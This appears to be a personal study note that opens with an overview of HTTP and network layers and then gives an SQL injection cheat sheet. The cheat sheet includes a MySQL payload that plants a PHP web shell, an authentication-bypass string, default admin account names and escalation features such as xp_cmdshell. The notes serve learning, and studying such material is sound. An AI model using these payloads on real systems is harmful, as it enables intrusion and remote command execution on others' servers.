# HTTP

HTTP 는 Application 계층에서 이루어진다


| 계층명               | 기능                                 |
|-------------------|------------------------------------|
| 응용계층(Application) | 웹, 텔넷, ftp                         |
| 전송계층(Transfer)    | 두 호스트 간의 데이터 흐름 제공                 |
| 네트워크(Network)     | 송수신간 전송 단위인 **패킷** 이동 제어 및 최적 이동경로 |
| 링크계층              | 하드웨어 인터페이스 역활과 데이터 전송              |
| ...               | ...                                |

HTTP 특징
- Request 와 Response로 이루어짐
- Client의 요청으로 시작
- Stateless Protocol -> (cookie, session 등을 사용)

## SQL Injection

### Procedure
- Time delay check where input is run
- Try `'` for input and see the result.
    - Does error occur?
    - Where does error occur? (DB or )

### WebShell (MYSQL)
- With root auth : `UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/victim.com/cmd.php" --` 

### Basic Config
- Microsoft SQL Server : `sa`
- MySQL : `root` && `anonymous`
- Oracle : `SYS, SYSTEM, DBSNMP, OUTLN`

### Authority Empowerment
- `xp_cmdshell, OPENROWSET, LOAD_FILE, ActiveX, Java support`

### Inline Injection
- use ` 1' OR 1=1 OR 1=1` to by pass `id = input1 AND password = input2`;
 

#### Referenced
- `SQL injection` by `Justin Clarke`
